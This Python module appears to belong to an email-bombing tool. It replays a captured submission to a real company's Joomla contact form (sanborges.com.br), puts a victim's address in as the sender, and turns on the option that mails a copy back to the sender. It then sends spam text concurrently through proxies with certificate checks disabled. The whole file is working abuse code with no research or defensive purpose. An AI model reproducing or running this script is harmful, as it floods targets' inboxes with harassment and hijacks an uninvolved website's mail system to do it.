from os.path import basename

import requests

import module.config
from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            'aiContactSafeMessageId': '787',
            '52fa861fac413316cd184a7276c9fc53': 'jed11ksqmgp0o0bj1je3fl4f25',
            '7484f2f1f21bc31e6df913cd5c917e08': 'en-GB',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryJRAA7BozbW82SBhZ',
            # 'Cookie': 'aiContactSafeMessageId=787; 52fa861fac413316cd184a7276c9fc53=jed11ksqmgp0o0bj1je3fl4f25; 7484f2f1f21bc31e6df913cd5c917e08=en-GB',
            'Origin': 'http://www.sanborges.com.br',
            'Pragma': 'no-cache',
            'Proxy-Connection': 'keep-alive',
            'Referer': 'http://www.sanborges.com.br/web/index.php/en/contact-us',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        params = {
            'option': 'com_aicontactsafe',
        }

        data = '------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="aics_name_2"\r\n\r\ntest\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="aics_company"\r\n\r\ntest\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="aics_email_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="aics_phone_2"\r\n\r\n213123\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="aics_subject_2"\r\n\r\ntest\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="aics_message_2"\r\n\r\ntest\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="countdown_aics_message_2"\r\n\r\n496\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="aics_send_to_sender_2"\r\n\r\non\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="option"\r\n\r\ncom_aicontactsafe\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="sTask"\r\n\r\nmessage\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="task"\r\n\r\ndisplay\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="send_mail"\r\n\r\n1\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="pf"\r\n\r\n8\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="return_to"\r\n\r\n\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="current_url"\r\n\r\nhttp://www.sanborges.com.br/web/index.php/en/contact-us\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="Itemid"\r\n\r\n541\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="lang"\r\n\r\nen\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="back_button"\r\n\r\n0\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="boxchecked"\r\n\r\n0\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="use_ajax"\r\n\r\n0\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="r_id"\r\n\r\n2126629703\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ\r\nContent-Disposition: form-data; name="31e851e1dc808fb9caa12250a2a85d09"\r\n\r\n1\r\n------WebKitFormBoundaryJRAA7BozbW82SBhZ--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text()).encode()

        response = requests.post(
            'http://www.sanborges.com.br/web/index.php',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            verify=False,
            proxies=self.get_proxies(), timeout=20
        )
        return response


def main():
    s = 'Email sent. Thank you for your message.'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
